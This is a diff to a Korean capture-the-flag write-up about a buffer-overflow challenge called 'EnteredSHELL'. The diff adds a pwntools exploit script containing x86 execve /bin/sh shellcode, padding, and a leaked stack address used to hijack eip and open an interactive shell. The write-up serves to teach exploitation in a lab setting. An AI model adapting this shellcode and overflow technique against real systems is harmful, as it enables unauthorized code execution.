@@ -22,6 +22,21 @@ gets로 s변수에 입력을 받으므로 Buffer overflow가 일어난다는 사
 
 그러므로 시나리오는 stack에 gets로 값을 받음을 이용, shellcode를 stack에 넣어주고, eip를 leak된 값을 이용해서 stack address로 옮겨주면 된다.	끝
 
+~~~
+from pwn import *
+p = process('./EnteredSHELL')
+#p = remote('52.78.156.241', 7777)
+
+p.recvuntil(' : ')
+leak = int(p.recv()[:8],16)
+shell = '\x31\xc0\x50\xbe\x2e\x2e\x72\x67\x81\xc6\x01\x01\x01\x01\x56\xbf\x2e\x62\x69\x6e\x47\x57\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
+pay = shell + 'a'*234 + p32(leak)
+log.info('stack : ' + hex(leak))
+p.sendline(pay)
+p.recvuntil(p32(leak) + '\n')
+p.interactive()
+~~~
+
 ![텍스트](https://imgur.com/zP1JqEM.png)
 
 서버가 닫혀있어서 플래그는 모르겠다.
